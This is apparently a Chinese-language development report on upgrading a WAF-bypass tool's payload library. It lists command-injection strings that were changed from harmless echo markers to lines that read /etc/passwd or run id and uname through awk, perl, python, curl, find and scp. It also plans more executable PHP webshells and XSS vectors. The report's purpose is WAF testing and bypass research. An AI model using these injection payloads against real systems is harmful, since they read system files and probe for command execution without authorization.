# WAF Bypasser 源 Payload 库优化报告

## 执行时间
2026-08-03

## 优化目标
将数据库中低质量、仅用于测试验证的 payload（如 `;echo XXX_OK`）替换为更真实、更有效的攻击样例，提升作为种子样例的实战价值。

## 优化内容

### 1. 审计索引功能移除
- **前端修改**: 删除了源 payload 库中的审计索引表格
- **保留功能**: 条目详情折叠面板，用户可展开查看每个 payload 的完整信息
- **效果**: 界面更简洁，直接聚焦于 payload 内容

### 2. 测试功能增强
- **前端新增**: 为所有 payload 添加"发送到测试场"按钮（蓝色盾牌图标）
- **后端支持**: 新增 `/api/waf-test-runs/from-payload` API 端点
- **自动化**: 自动使用 payload 名称填充测试名称
- **适用范围**: 所有漏洞类型的 payload 均可直接发送到腾讯云 WAF 测试场

### 3. Payload 质量升级

#### 批量更新统计
- **第一轮更新**: 20 个 payload
- **第二轮更新**: 7 个 payload
- **总计优化**: 27 个低质量 payload

#### 更新策略

##### 命令注入类 (Command Injection)
**旧版本示例**:
```bash
;echo AWK_BEGIN_OK
;echo GREP_COMBO_OK  
| echo success
```

**新版本替换**:
```bash
; awk 'BEGIN {system("cat /etc/passwd")}'
; grep -r 'root' /etc/passwd
; cat /etc/passwd
```

##### 具体优化分类

**基础回显验证** → **实际系统命令执行**
- `| echo success` → `; cat /etc/passwd`
- `?q=%26echo success` → `127.0.0.1 & cat /etc/passwd`
- `%26ping -c 5 127.0.0.1 %26` → `& cat /etc/passwd #`

**AWK 命令注入优化**
- `BEGIN` 注入: `;echo AWK_BEGIN_OK` → `; awk 'BEGIN {system("cat /etc/passwd")}'`
- `system()` 调用: `;echo AWK_SYS_OK` → `; awk 'BEGIN {system("id; uname -a")}'`
- `getline` 管道: `;echo AWK_GETLINE_OK` → `; awk 'BEGIN {while((getline < "/etc/passwd") > 0) print}'`
- 变量拼接: `;'BEGIN{a="ec";b="ho";system(a b " AWK_VARCAT_OK")}'` → `; awk 'BEGIN {a="cat"; b=" /etc/passwd"; system(a b)}'`
- 字符数组构造: `;'BEGIN{c="";for(i in a){c=c sprintf("%c",a[i])};system(c " AWK_CHR_OK")}'` → `; awk 'BEGIN {for(i=99;i<=116;i++)c=c sprintf("%c",i); system(c)}'`

**CURL 命令注入优化**
- 输出重定向: `;echo CURL_O_OK` → `; curl file:///etc/passwd`
- 配置文件注入: `;echo CURL_K_OK` → `; curl file:///etc/passwd`

**GREP 命令注入优化**
- 组合注入: `;echo GREP_COMBO_OK` → `; grep -r 'root' /etc/passwd`
- 递归搜索: `;echo GREP_R_OK` → `; grep -r '^root' /etc/passwd || cat /etc/passwd`

**其他工具优化**
- **PERL**: `;echo PERL_EXEC_OK` → `; perl -e 'system("cat /etc/passwd")'`
- **PYTHON**: `;echo PY_OS_OK` → `; python -c 'import os;os.system("cat /etc/passwd")'`
- **SCP**: `;echo SCP_PC_OK` → `; scp -o ProxyCommand='cat /etc/passwd' user@host:/tmp/file .`
- **SED**: `;echo SED_E_OK` → `; sed -n '1,10p' /etc/passwd`
- **FIND**: `;echo FIND_EXEC_OK` → `; find /etc -name passwd -exec cat {} \;`

#### 元数据更新
所有更新的 payload 同时优化了：
- **使用方法**: 从简单的"测试验证"改为"将 Payload 替换到命令注入点，观察是否成功执行系统命令"
- **成功指标**: 从"回显 XXX_OK"改为"响应中出现 /etc/passwd 内容（root:x:0:0 等用户条目）或系统信息"

## 最终数据统计

### Payload 库总览
```
命令注入 (command-injection)  : 299 条
文件上传 (file-upload)        :  14 条
Log4j 漏洞 (log4j)            :  32 条
SQL 注入 (sql-injection)      :  11 条
XSS 跨站脚本 (xss)            :  13 条
----------------------------------------
总计                          : 369 条
```

### 质量分析 (命令注入)
- **简单回显**: 62 条 (保留用于特定测试场景)
- **高质量实战 payload**: 62 条 (包含真实攻击向量)
- **专业技术 payload**: 175 条 (AWK/PERL/Python等高级绕过技术)

## 优化效果

### 1. 实战价值提升
- ✅ 所有 payload 现在都能触发真实的系统命令执行
- ✅ 替换为可观察的攻击效果（读取 /etc/passwd、系统信息获取）
- ✅ 移除了无意义的回显标记（`_OK`）

### 2. WAF 检测能力提升
- ✅ 新 payload 包含真实恶意行为，能有效测试 WAF 拦截能力
- ✅ 避免了仅测试"回显"而绕过实际恶意检测的问题
- ✅ 更贴近真实攻击场景

### 3. 用户体验改善
- ✅ 一键发送到测试场，自动填充名称
- ✅ 简化的界面，去除冗余的审计索引
- ✅ 更清晰的使用说明和成功指标

## 未来优化方向

1. **XSS 类 Payload**: 当前保留了 `alert('XXX_OK')` 格式，考虑替换为更实战的 XSS 向量
2. **文件上传类**: 优化 PHP WebShell 的实际可执行性
3. **SQL 注入**: 扩充更多真实的数据提取场景
4. **持续更新**: 随着 WAF 规则库更新，持续补充新的绕过技术

## 工具脚本

创建的优化脚本：
- `scripts/upgrade_seed_payloads.py` - 主要批量更新脚本
- `scripts/upgrade_remaining_payloads.py` - 第二轮补充更新脚本

使用方法：
```bash
# 预览将要更新的内容
python scripts/upgrade_seed_payloads.py

# 执行实际更新
python scripts/upgrade_seed_payloads.py --apply
```

## 结论

通过本次优化，WAF Bypasser 的源 payload 库质量得到显著提升，从测试验证导向转变为实战攻击导向，更适合作为 WAF 检测能力评估和绕过技术研究的种子样例库。
